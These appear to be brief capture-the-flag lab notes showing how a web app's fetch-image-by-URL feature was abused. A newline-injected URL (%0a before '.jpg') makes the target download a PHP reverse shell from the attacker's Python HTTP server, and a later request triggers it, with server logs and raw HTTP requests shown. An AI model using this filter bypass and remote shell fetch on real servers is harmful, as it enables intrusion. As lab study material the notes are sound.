
![[Pasted image 20240405000115.png|600]]

![[Pasted image 20240405000204.png|800]]
Caught request

```
┌──(kali㉿kali)-[~/shells]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.66.65 - - [04/Apr/2024 22:04:29] "GET /shell.php.jpg HTTP/1.1" 200 -
10.10.66.65 - - [04/Apr/2024 22:09:23] code 404, message File not found
10.10.66.65 - - [04/Apr/2024 22:09:23] "GET /shell.php HTTP/1.1" 404 -
10.10.66.65 - - [04/Apr/2024 22:13:17] code 404, message File not found
10.10.66.65 - - [04/Apr/2024 22:13:17] "GET /shell.php HTTP/1.1" 404 -
10.10.66.65 - - [04/Apr/2024 22:13:52] "GET /revsh.php HTTP/1.1" 200 -
10.10.66.65 - - [04/Apr/2024 22:14:16] "GET /revsh.php HTTP/1.1" 200 -
10.10.66.65 - - [04/Apr/2024 23:29:52] "GET /revsh.php HTTP/1.1" 200 -
```


```http
POST /cloud/ HTTP/1.1
Host: 10.10.66.65
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://10.10.66.65
Connection: close
Referer: http://10.10.66.65/cloud/
Cookie: PHPSESSID=8etvio8s716qqj6hfgg5145gkk
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

url=http%3A%2F%2F10.18.21.236%3A8000%2Frevsh.php%0a.jpg
```
Obs the %0a

http://10.10.66.65/cloud/images/cat.jpg

Go to script
```http
GET /cloud/images/revsh.php HTTP/1.1
Host: 10.10.66.65
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=8etvio8s716qqj6hfgg5145gkk
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
```

